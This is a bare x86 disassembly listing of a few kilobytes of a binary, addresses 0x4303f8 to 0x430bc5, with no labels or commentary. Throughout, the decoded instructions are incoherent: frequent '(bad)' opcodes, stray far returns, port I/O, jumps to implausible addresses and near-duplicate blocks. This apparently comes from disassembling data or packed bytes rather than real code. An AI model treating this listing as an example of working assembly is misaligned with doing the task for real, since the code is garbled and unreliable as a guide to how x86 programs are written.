  4303f8:	mov    edi,DWORD PTR [edi+0x4572bc]
  4303fe:	xor    eax,edi
  430400:	adc    DWORD PTR [ebp-0xcd0065],0x8b3d31
  43040a:	rcl    BYTE PTR [eax-0x40],1
  43040d:	inc    ebp
  43040e:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  430416:	inc    ebp
  430417:	xchg   ebp,eax
  430418:	ud0    ebp,DWORD PTR [ebx]
  43041b:	inc    DWORD PTR [eax]
  43041d:	daa    
  43041e:	jbe    0x430420
  430420:	mov    dl,BYTE PTR [eax-0x80]
  430423:	push   ebp
  430424:	pop    ds
  430425:	mov    ecx,DWORD PTR [esp+esi*8]
  430428:	inc    eax
  430429:	retf   
  43042a:	inc    ebp
  43042b:	iret   
  43042c:	jb     0x4303f6
  43042e:	mov    eax,DWORD PTR [edi]
  430430:	int3   
  430431:	inc    ebp
  430432:	inc    ebp
  430433:	add    DWORD PTR [ecx],esi
  430435:	add    BYTE PTR [ebx+ecx*4+0x4df0bc89],bl
  43043c:	xor    dh,BYTE PTR [ebx]
  43043e:	pushf  
  43043f:	lea    ecx,[ecx+0x4d72d808]
  430445:	add    BYTE PTR [ebx],dh
  430447:	inc    ebp
  430448:	mov    DWORD PTR [ebx-0x3f64174c],ecx
  43044e:	xor    dl,BYTE PTR [edx]
  430450:	add    eax,DWORD PTR [ebp-0x77]
  430453:	mov    eax,esp
  430455:	fmul   QWORD PTR [ebp-0x3d]
  430458:	xor    eax,DWORD PTR [ebx+eax*1+0x832899b]
  43045f:	mov    DWORD PTR [ebp-0x24],eax
  430462:	rol    DWORD PTR [ebp-0x64],1
  430465:	xor    eax,edi
  430467:	mov    ecx,0xff858db0
  43046c:	clc    
  43046d:	enter  0x4d45,0x3c
  430471:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  430478:	test   esi,edi
  43047a:	clc    
  43047b:	inc    DWORD PTR [ebp+0x45]
  43047e:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  430486:	test   DWORD PTR [ecx],esi
  430488:	clc    
  430489:	pushf  
  43048a:	inc    ebp
  43048b:	(bad)  
  43048c:	cmp    ah,bh
  43048e:	pushf  
  43048f:	inc    ebp
  430490:	mov    edx,DWORD PTR [eax-0x24]
  430493:	add    BYTE PTR [ebp+0x0],dl
  430496:	xor    ecx,DWORD PTR [ecx+0x103bd003]
  43049c:	cmovge edx,DWORD PTR [ebx+ecx*4]
  4304a0:	add    al,dl
  4304a2:	jmp    0x1040672
  4304a7:	jb     0x4304f6
  4304a9:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  4304af:	xor    ecx,DWORD PTR [ebp+0x3b]
  4304b2:	xor    ecx,DWORD PTR [edi]
  4304b4:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  4304b8:	(bad)  
  4304ba:	clc    
  4304bb:	int3   
  4304bc:	add    BYTE PTR [ebx+ecx*4+0x5500b007],al
  4304c3:	push   cs
  4304c4:	xor    ecx,eax
  4304c6:	xor    esp,ecx
  4304c8:	add    ebp,DWORD PTR [eax]
  4304ca:	add    esi,DWORD PTR [eax]
  4304cc:	(bad)  
  4304ce:	retf   0x55cc
  4304d1:	repnz mov eax,DWORD PTR [ebp-0x10]
  4304d5:	(bad)  
  4304d6:	cli    
  4304d7:	fdiv   st(1),st
  4304d9:	test   DWORD PTR [eax+edi*8],ecx
  4304dc:	dec    ebp
  4304dd:	inc    ebp
  4304de:	xor    edi,DWORD PTR [eax-0x7167afd]
  4304e4:	add    BYTE PTR [ebp+0x0],al
  4304e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4304ea:	mov    ecx,ebx
  4304ec:	clc    
  4304ed:	jne    0x4304ba
  4304ef:	mov    esi,0xd672d3
  4304f4:	into   
  4304f5:	into   
  4304f6:	scas   eax,DWORD PTR es:[edi]
  4304f7:	dec    ebp
  4304f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4304fe:	sub    ecx,esi
  430500:	cmp    ecx,DWORD PTR [ebp+0x77]
  430503:	(bad)  
  430504:	mov    edi,eax
  430506:	mov    al,0x85
  430508:	mov    eax,edi
  43050a:	add    BYTE PTR [ebp-0x75],al
  43050d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430514:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43051a:	(bad)  
  43051c:	retf   0x559c
  43051f:	(bad)  
  430520:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430527:	inc    ebp
  430528:	add    eax,0xeb9c4d3f
  43052d:	(bad)  
  43052e:	mov    ecx,eax
  430530:	lods   al,BYTE PTR ds:[esi]
  430531:	test   DWORD PTR [ebp-0x8],edx
  430534:	xor    ecx,DWORD PTR [ebp+0x33]
  430537:	mov    eax,DWORD PTR [ebx]
  430539:	lock add ecx,ebx
  43053c:	bswap  esi
  43053e:	retf   0x55d1
  430541:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430547:	jmp    0x430542
  430549:	add    BYTE PTR ds:0xebc44d8b,al
  43054f:	push   ebp
  430550:	mov    ebp,DWORD PTR [ebx]
  430552:	test   al,0x8b
  430554:	push   ebp
  430555:	clc    
  430556:	xor    ecx,ebx
  430558:	xor    ecx,esi
  43055a:	add    edx,ecx
  43055c:	add    eax,DWORD PTR [edx+0xca010f]
  430562:	push   ebp
  430563:	dec    ebp
  430564:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43056a:	stc    
  43056b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430571:	scas   eax,DWORD PTR es:[edi]
  430572:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430578:	xor    ebp,DWORD PTR [ebx]
  43057a:	xor    edi,DWORD PTR [ebx]
  43057c:	add    esi,DWORD PTR [edi+0x3]
  43057f:	mov    ecx,DWORD PTR [edi]
  430581:	clc    
  430582:	retf   0x55cb
  430585:	into   
  430586:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43058d:	mov    eax,0x3376554d
  430592:	mov    esi,DWORD PTR [ebx]
  430594:	enter  0x5503,0x3
  430598:	xor    ecx,DWORD PTR [edi]
  43059a:	xor    ecx,edx
  43059c:	add    edx,DWORD PTR [ebp+0x3]
  43059f:	mov    ecx,DWORD PTR [edi]
  4305a1:	lock retf 0x4dfa
  4305a5:	stc    
  4305a6:	mov    ecx,DWORD PTR [eax]
  4305a8:	or     BYTE PTR [ebp+0x4d],cl
  4305ab:	jmp    0x107063b
  4305b0:	dec    ebp
  4305b1:	dec    ebp
  4305b2:	(bad)  
  4305b3:	mov    esp,esp
  4305b5:	clc    
  4305b6:	test   ebx,ecx
  4305b8:	clc    
  4305b9:	ror    DWORD PTR [ebp-0x2a],cl
  4305bc:	mov    esi,ecx
  4305be:	in     al,dx
  4305bf:	scas   eax,DWORD PTR es:[edi]
  4305c0:	inc    ebp
  4305c1:	mov    esi,DWORD PTR [ebx]
  4305c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4305ca:	retf   
  4305cb:	ja     0x43059b
  4305cd:	mov    ebp,DWORD PTR [eax-0x48]
  4305d0:	dec    ebp
  4305d1:	xor    ecx,DWORD PTR [di+0x3]
  4305d5:	mov    ebp,eax
  4305d7:	clc    
  4305d8:	push   ebp
  4305d9:	retf   
  4305da:	mov    dl,bl
  4305dc:	adc    esi,edx
  4305de:	jb     0x4305ae
  4305e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4305e6:	in     al,dx
  4305e7:	jge    0x4305b4
  4305e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4305ec:	mov    esi,DWORD PTR [edi-0x24]
  4305ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4305f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4305fc:	mov    edx,ebx
  4305fe:	in     al,dx
  4305ff:	(bad)  
  430600:	ror    esi,cl
  430602:	push   ebp
  430603:	scas   eax,DWORD PTR es:[edi]
  430604:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43060a:	fwait
  43060b:	sub    esi,DWORD PTR [edx]
  43060d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430613:	lods   al,BYTE PTR ds:[esi]
  430614:	xor    esp,DWORD PTR [ebx]
  430616:	add    ecx,DWORD PTR [ebp-0x18]
  430619:	mov    edi,DWORD PTR [ebp-0x8]
  43061c:	mov    bl,cl
  43061e:	cmp    dl,bl
  430620:	jb     0x4305f0
  430622:	add    dh,dl
  430624:	dec    ebp
  430625:	scas   eax,DWORD PTR es:[edi]
  430626:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43062c:	shr    DWORD PTR [ebx],cl
  43062e:	into   
  43062f:	cmp    edx,esi
  430631:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430637:	dec    ebp
  430638:	dec    ebp
  430639:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43063f:	retf   
  430640:	xor    edx,esi
  430642:	add    ecx,esi
  430644:	imul   ecx,edx
  430647:	mov    DWORD PTR [ebp+0x8],edx
  43064a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43064d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430653:	add    esi,DWORD PTR [ebx]
  430655:	mov    ah,0x3
  430657:	inc    ebp
  430658:	rdtsc  
  43065a:	xlat   BYTE PTR ds:[ebx]
  43065b:	pushf  
  43065c:	jge    0x4305e7
  43065e:	xor    ebx,esp
  430660:	sub    eax,DWORD PTR [ebp-0x73]
  430663:	(bad)  
  430664:	cmp    al,al
  430666:	jb     0x4305ed
  430668:	add    al,bh
  43066a:	ror    DWORD PTR [ebp-0x7a],1
  43066d:	xor    edi,edi
  43066f:	add    edi,edi
  430671:	jmp    0x4306c0
  430673:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430679:	dec    ebp
  43067a:	into   
  43067b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430681:	fwait
  430682:	shl    DWORD PTR [edx],cl
  430684:	retf   0x5588
  430687:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43068d:	add    eax,DWORD PTR [eax]
  43068f:	call   0x8ace5be1
  430694:	fcom   DWORD PTR [ecx]
  430696:	retf   
  430697:	jb     0x4306fe
  430699:	add    ch,cl
  43069b:	dec    ebp
  43069c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4306a2:	dec    ebp
  4306a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4306a9:	jge    0x430679
  4306ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4306b1:	add    cl,dh
  4306b3:	dec    ebp
  4306b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4306ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4306be:	add    ah,bl
  4306c0:	jge    0x43064e
  4306c2:	push   0xffffff9b
  4306c4:	push   0x8b3032
  4306c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4306cd:	xor    edi,edi
  4306cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4306d2:	inc    ebp
  4306d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4306d9:	dec    ebp
  4306da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4306e0:	jbe    0x43066d
  4306e2:	mov    esp,eax
  4306e4:	ror    bl,1
  4306e6:	enter  0x14ce,0xaf
  4306ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4306f0:	push   ebp
  4306f1:	retf   0x5540
  4306f4:	push   ebp
  4306f5:	mov    esi,DWORD PTR [edx-0x18]
  4306f8:	mov    edx,ebx
  4306fa:	cld    
  4306fb:	(bad)  
  4306fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430703:	sti    
  430704:	add    dh,cl
  430706:	push   0xffffff94
  430708:	call   FWORD PTR [ebx+0x3b5032d0]
  43070e:	mov    ecx,DWORD PTR [edi]
  430710:	enter  0x455e,0xff
  430714:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43071a:	xor    esi,DWORD PTR [ebx]
  43071c:	mov    DWORD PTR [ebx],0xcace0f9c
  430722:	aas    
  430723:	push   ebp
  430724:	inc    ebp
  430725:	xor    edx,esi
  430727:	add    edx,esi
  430729:	mov    eax,DWORD PTR [ebx]
  43072b:	(bad)  
  43072c:	jmp    0x4306ba
  43072e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430734:	rol    ah,1
  430736:	mov    esi,0xf133104d
  43073b:	mov    edx,0xff388d80
  430740:	mov    dh,0xd1
  430742:	cmp    edx,DWORD PTR [ebp+0xf]
  430745:	mov    eax,DWORD PTR [edx-0x28]
  430748:	add    BYTE PTR [ebp-0x75],bh
  43074b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430752:	fwait
  430753:	retf   0x8632
  430756:	cmp    ebp,0x8
  430759:	call   ebx
  43075b:	inc    ebp
  43075c:	inc    ebp
  43075d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430763:	mov    esi,DWORD PTR [ecx]
  430765:	int3   
  430766:	pushf  
  430767:	add    al,0xc7
  430769:	add    al,al
  43076b:	add    bl,al
  43076d:	(bad)  
  43076e:	clc    
  43076f:	int3   
  430770:	inc    ebp
  430771:	add    BYTE PTR [ecx],dh
  430773:	push   eax
  430774:	pushf  
  430775:	mov    edi,eax
  430777:	enter  0xc008,0x85
  43077b:	aas    
  43077c:	clc    
  43077d:	gs inc ebp
  43077f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430785:	push   ss
  430786:	xor    ecx,DWORD PTR [ebp+0x3]
  430789:	sub    edx,DWORD PTR [ecx-0x76]
  43078c:	dec    ebp
  43078d:	add    DWORD PTR [ebx+0x88d845],ecx
  430793:	mov    esi,DWORD PTR [ebx]
  430795:	or     BYTE PTR [ebx],al
  430797:	cmp    edx,DWORD PTR [ecx-0x34]
  43079a:	dec    ebp
  43079b:	out    dx,eax
  43079c:	xor    eax,DWORD PTR [ebp+0x3]
  43079f:	mov    edx,DWORD PTR [ecx-0x28]
  4307a2:	dec    ebp
  4307a3:	add    BYTE PTR [ebx],dh
  4307a5:	push   0x518003
  4307aa:	push   eax
  4307ab:	add    BYTE PTR [ebx-0x300748b],cl
  4307b1:	sbb    BYTE PTR [ebp+0x45],cl
  4307b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4307ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4307c0:	dec    ebp
  4307c1:	inc    ebp
  4307c2:	xor    edx,esi
  4307c4:	add    edx,esi
  4307c6:	push   ecx
  4307c7:	(bad)  
  4307c8:	dec    ebp
  4307c9:	mov    al,ds:0xc5d83dff
  4307ce:	retf   
  4307cf:	(bad)  
  4307d0:	into   
  4307d1:	sub    bh,bh
  4307d3:	dec    esp
  4307d4:	adc    al,0x9c
  4307d6:	inc    ebp
  4307d7:	push   ebp
  4307d8:	test   DWORD PTR [edi],ecx
  4307da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4307e1:	jmp    0xc9bc16f5
  4307e6:	add    cl,dl
  4307e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4307f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4307f8:	rol    BYTE PTR [eax],0x54
  4307fb:	clc    
  4307fc:	gs jb  0x430806
  4307ff:	mov    eax,DWORD PTR [ebp-0x30]
  430802:	xor    al,0x40
  430804:	sub    al,0xc7
  430806:	mov    al,ah
  430808:	add    DWORD PTR [ebp+0x4534f845],eax
  43080e:	sub    al,0x80
  430810:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430817:	mov    ch,0xff
  430819:	clc    
  43081a:	add    DWORD PTR [ebp+0x60],0x3d
  43081e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430825:	inc    ebp
  430826:	dec    DWORD PTR [ebx-0x3427f701]
  43082c:	test   esi,ecx
  43082e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430834:	push   eax
  430835:	add    DWORD PTR [ebp+0x0],eax
  430838:	dec    ebx
  43083a:	or     al,0xce
  43083c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430843:	into   
  430844:	add    BYTE PTR [ebx-0x34ff2000],cl
  43084a:	mov    esi,ecx
  43084c:	sar    bh,0x45
  43084f:	adc    al,0x8b
  430851:	clc    
  430852:	fadd   DWORD PTR [ebp+0x0]
  430855:	mov    ebp,DWORD PTR [edx+0x8]
  430858:	push   edi
  430859:	adc    BYTE PTR [eax+0x1],0x83
  43085d:	add    al,al
  43085f:	retf   
  430860:	mov    ecx,esi
  430862:	cld    
  430863:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430869:	into   
  43086a:	add    BYTE PTR [ebx+0x756ae000],cl
  430870:	jne    0x4308a5
  430872:	inc    DWORD PTR [ebx]
  430874:	rcl    BYTE PTR [ecx+0x50],1
  430877:	push   eax
  430878:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43087e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430885:	sar    bh,0x84
  430888:	or     BYTE PTR [ebx],al
  43088a:	push   eax
  43088b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430891:	pushf  
  430892:	xor    edi,eax
  430894:	pushf  
  430895:	mov    ah,0x89
  430897:	test   esp,ebp
  430899:	clc    
  43089a:	inc    ebp
  43089b:	inc    ebp
  43089c:	mov    DWORD PTR [eax+eax*8],esi
  43089f:	sub    al,0x32
  4308a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4308a8:	dec    ebp
  4308a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4308b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4308b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4308be:	shl    DWORD PTR [ebp-0x380064],1
  4308c4:	enter  0x858d,0x60
  4308c8:	clc    
  4308c9:	inc    DWORD PTR [ebp+0x50]
  4308cc:	cmp    al,0x75
  4308ce:	pushf  
  4308cf:	(bad)  
  4308d0:	(bad)  
  4308d1:	pop    esp
  4308d2:	lods   al,BYTE PTR ds:[esi]
  4308d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4308d9:	mov    edi,DWORD PTR [esi]
  4308db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4308e2:	test   DWORD PTR [edi-0x8],edx
  4308e5:	sbb    al,0x45
  4308e7:	add    BYTE PTR [eax],bh
  4308e9:	push   0x8b809c
  4308ee:	loopne 0x430935
  4308f0:	push   ebp
  4308f1:	mov    esi,DWORD PTR [ebx]
  4308f3:	cld    
  4308f4:	add    eax,DWORD PTR [eax+0xf013b]
  4308fa:	adc    al,0x0
  4308fc:	add    bh,bh
  4308fe:	jmp    0xc00a1b
  430903:	add    BYTE PTR [ebp+0x45],cl
  430906:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  43090c:	dec    ebp
  43090d:	push   0x38033
  430912:	cmp    eax,DWORD PTR [eax]
  430914:	unpcklps xmm7,xmm0
  430917:	jne    0x430919
  430919:	dec    DWORD PTR [ebx+0x5545c818]
  43091f:	mov    DWORD PTR [ebx],esi
  430921:	shl    BYTE PTR [ebx],1
  430923:	inc    ebp
  430924:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  43092a:	retf   0x5575
  43092d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430933:	(bad)  
  430934:	stc    
  430935:	loopne 0x430943
  430937:	test   DWORD PTR [ebp-0x8],ecx
  43093a:	xor    eax,DWORD PTR [ebp+0x3]
  43093d:	mov    ebp,ecx
  43093f:	rol    BYTE PTR [eax],1
  430941:	inc    ebp
  430942:	add    BYTE PTR [eax-0x7747ab3],bh
  430948:	clc    
  430949:	inc    ebp
  43094a:	retf   
  43094b:	mov    edx,ebx
  43094d:	loopne 0x430925
  43094f:	retf   
  430950:	into   
  430951:	into   
  430952:	scas   eax,DWORD PTR es:[edi]
  430953:	dec    ebp
  430954:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  43095a:	sub    ecx,esi
  43095c:	cmp    ecx,DWORD PTR [ebp+0x77]
  43095f:	(bad)  
  430960:	mov    edi,eax
  430962:	enter  0x8985,0xf8
  430966:	add    BYTE PTR [ebp-0x75],al
  430969:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430970:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430976:	(bad)  
  430978:	retf   0x559c
  43097b:	(bad)  
  43097c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430983:	inc    ebp
  430984:	add    eax,0xeb9c4d3f
  430989:	(bad)  
  43098a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430990:	xor    ecx,DWORD PTR [ebp+0x33]
  430993:	mov    eax,DWORD PTR [ebx]
  430995:	in     al,dx
  430996:	add    ecx,ebx
  430998:	bswap  esi
  43099a:	retf   0x55d1
  43099d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  4309a3:	jmp    0x43099e
  4309a5:	add    BYTE PTR ds:0xebf44d8b,al
  4309ab:	push   ebp
  4309ac:	mov    ebp,DWORD PTR [ebx]
  4309ae:	mov    eax,0x33f8558b
  4309b3:	retf   
  4309b4:	xor    ecx,esi
  4309b6:	add    edx,ecx
  4309b8:	add    eax,DWORD PTR [edx+0xca010f]
  4309be:	push   ebp
  4309bf:	dec    ebp
  4309c0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  4309c6:	stc    
  4309c7:	rol    DWORD PTR ds:0xebce4dd6,cl
  4309cd:	scas   eax,DWORD PTR es:[edi]
  4309ce:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  4309d4:	xor    ebp,DWORD PTR [ebx]
  4309d6:	xor    edi,DWORD PTR [ebx]
  4309d8:	add    esi,DWORD PTR [edi+0x3]
  4309db:	mov    ecx,DWORD PTR [edi]
  4309dd:	clc    
  4309de:	retf   0x55cb
  4309e1:	into   
  4309e2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  4309e9:	test   al,0x4d
  4309eb:	push   ebp
  4309ec:	jbe    0x430a21
  4309ee:	mov    esi,DWORD PTR [ebx]
  4309f0:	mov    al,0x3
  4309f2:	push   ebp
  4309f3:	add    esi,DWORD PTR [ebx]
  4309f5:	rdpmc  
  4309f7:	retf   0x5503
  4309fa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430a00:	dec    ebp
  430a01:	stc    
  430a02:	mov    ecx,DWORD PTR [eax]
  430a04:	or     BYTE PTR [ebp+0x4d],cl
  430a07:	jmp    0x1370a97
  430a0c:	dec    ebp
  430a0d:	dec    ebp
  430a0e:	(bad)  
  430a0f:	mov    esp,esp
  430a11:	clc    
  430a12:	test   ebx,ecx
  430a14:	clc    
  430a15:	ror    DWORD PTR [ebp-0x2a],cl
  430a18:	mov    esi,ecx
  430a1a:	lock scas eax,DWORD PTR es:[edi]
  430a1c:	inc    ebp
  430a1d:	mov    esi,DWORD PTR [ebx]
  430a1f:	hlt    
  430a20:	pushf  
  430a21:	jge    0x4309ae
  430a23:	sub    esp,esp
  430a25:	cmp    ecx,ebx
  430a27:	ja     0x4309f7
  430a29:	mov    ebp,DWORD PTR [eax-0x58]
  430a2c:	dec    ebp
  430a2d:	xor    ecx,DWORD PTR [di+0x3]
  430a31:	mov    ebp,eax
  430a33:	clc    
  430a34:	push   ebp
  430a35:	retf   
  430a36:	mov    dl,bl
  430a38:	adc    esi,edx
  430a3a:	jb     0x430a0a
  430a3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430a42:	lock jge 0x430a10
  430a45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430a48:	mov    esi,DWORD PTR [edi-0x28]
  430a4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430a52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430a58:	mov    edx,ebx
  430a5a:	lock (bad) 
  430a5c:	ror    esi,cl
  430a5e:	push   ebp
  430a5f:	scas   eax,DWORD PTR es:[edi]
  430a60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430a66:	fwait
  430a67:	sub    esi,DWORD PTR [edx]
  430a69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430a70:	xor    esp,DWORD PTR [ebx]
  430a72:	add    ecx,DWORD PTR [ebp-0x18]
  430a75:	mov    edi,DWORD PTR [ebp-0x8]
  430a78:	mov    bl,cl
  430a7a:	cmp    dl,bl
  430a7c:	jb     0x430a4c
  430a7e:	add    dh,dl
  430a80:	dec    ebp
  430a81:	scas   eax,DWORD PTR es:[edi]
  430a82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430a88:	shr    DWORD PTR [ebx],cl
  430a8a:	into   
  430a8b:	cmp    edx,esi
  430a8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430a93:	dec    ebp
  430a94:	dec    ebp
  430a95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430a9b:	retf   
  430a9c:	xor    edx,esi
  430a9e:	add    ecx,esi
  430aa0:	imul   ecx,edx
  430aa3:	mov    DWORD PTR [ebp+0x8],edx
  430aa6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430aa9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430aaf:	add    esi,DWORD PTR [ebx]
  430ab1:	rol    BYTE PTR [ebx],0x45
  430ab4:	rdtsc  
  430ab6:	xlat   BYTE PTR ds:[ebx]
  430ab7:	pushf  
  430ab8:	jge    0x430a43
  430aba:	xor    ebx,eax
  430abc:	sub    eax,DWORD PTR [ebp-0x73]
  430abf:	(bad)  
  430ac0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430ac7:	dec    ebp
  430ac8:	xchg   BYTE PTR [ebx],dh
  430aca:	inc    DWORD PTR [ebx]
  430acc:	(bad)  
  430acd:	jmp    0x430b1c
  430acf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430ad5:	dec    ebp
  430ad6:	into   
  430ad7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430add:	fwait
  430ade:	shl    DWORD PTR [edx],cl
  430ae0:	retf   0x5588
  430ae3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430ae9:	add    eax,DWORD PTR [eax]
  430aeb:	call   0x8ace603d
  430af0:	fcom   QWORD PTR [ecx]
  430af2:	retf   
  430af3:	jb     0x430b5a
  430af5:	add    ch,cl
  430af7:	dec    ebp
  430af8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430afe:	dec    ebp
  430aff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430b05:	jge    0x430ad5
  430b07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430b0d:	add    cl,dh
  430b0f:	dec    ebp
  430b10:	dec    DWORD PTR [ebx-0x2c031b01]
  430b16:	inc    ebp
  430b17:	push   ebp
  430b18:	dec    DWORD PTR [ebx-0x73ff2734]
  430b1e:	lea    ebx,[ebx-0x7400cdac]
  430b24:	push   eax
  430b25:	mov    ah,0x45
  430b27:	push   ebp
  430b28:	mov    esi,DWORD PTR [ebx]
  430b2a:	les    esi,FWORD PTR [ebx]
  430b2c:	add    BYTE PTR [ebx],al
  430b2e:	inc    DWORD PTR [ebx]
  430b30:	mov    ecx,DWORD PTR [edi]
  430b32:	cld    
  430b33:	retf   0x4d80
  430b36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430b3c:	jne    0x430ac9
  430b3e:	jmp    eax
  430b40:	ror    bl,1
  430b42:	or     cl,dh
  430b44:	add    BYTE PTR [edi-0xf2f7475],ch
  430b4a:	not    bl
  430b4c:	adc    al,0xca
  430b4e:	inc    ebp
  430b4f:	push   ebp
  430b50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430b56:	push   0xaf80d6
  430b5b:	mov    eax,DWORD PTR [eax]
  430b5d:	in     al,0xff
  430b5f:	sti    
  430b60:	sbb    dh,cl
  430b62:	pop    esi
  430b63:	xchg   esp,eax
  430b64:	leave  
  430b65:	fwait
  430b66:	add    al,0x32
  430b68:	push   ebp
  430b69:	cmp    ebp,esp
  430b6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430b6f:	dec    DWORD PTR [ecx-0x740f0375]
  430b75:	push   ebp
  430b76:	cld    
  430b77:	xor    ebp,ebx
  430b79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430b7f:	push   ebp
  430b80:	clc    
  430b81:	xor    esi,ecx
  430b83:	add    esi,DWORD PTR [ebp-0x75]
  430b86:	(bad)  
  430b87:	hlt    
  430b88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430b8f:	mov    DWORD PTR [esi],eax
  430b91:	hlt    
  430b92:	(bad)  
  430b93:	dec    ebp
  430b94:	add    esi,DWORD PTR [ebx]
  430b96:	(bad)  
  430b97:	mov    edx,0xffc68d0a
  430b9c:	add    dl,cl
  430b9e:	leave  
  430b9f:	push   ebp
  430ba0:	push   ebp
  430ba1:	mov    ebp,esp
  430ba3:	fcom   QWORD PTR [ecx+0x7d]
  430ba6:	inc    ebp
  430ba7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430bad:	iret   
  430bae:	cld    
  430baf:	retf   0x868f
  430bb2:	loopne 0x430bb1
  430bb4:	mov    edi,edi
  430bb6:	mov    esi,DWORD PTR [ebp-0x8]
  430bb9:	mov    esi,eax
  430bbb:	cld    
  430bbc:	jne    0x430b6e
  430bbe:	mov    BYTE PTR [ecx],0xa
  430bc1:	add    dh,al
  430bc3:	test   DWORD PTR [eax],ecx
  430bc5:	inc    esi
